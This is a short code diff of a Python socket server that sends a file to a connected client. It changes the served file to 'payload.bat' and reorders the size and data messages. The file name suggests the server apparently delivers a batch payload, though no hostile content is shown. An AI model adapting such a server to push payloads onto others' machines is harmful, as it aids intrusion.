@@ -16,12 +16,12 @@ SERVER2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 SERVER2.bind(ADDR2)
 def file1(conn):
     #### enter the file path #####
-    filesize = os.path.getsize("1.txt")
+    filesize = os.path.getsize("payload.bat")
     ##also enter file path##
-    with open("1.txt", 'rb') as f:
+    with open("payload.bat", 'rb') as f:
         data =f.read(1024)
-        conn.send(data)
         conn.send(str(filesize).encode(format))
+        conn.send(data)
         time.sleep(2)
         conn.send(b"<DONE>")
         f.close()
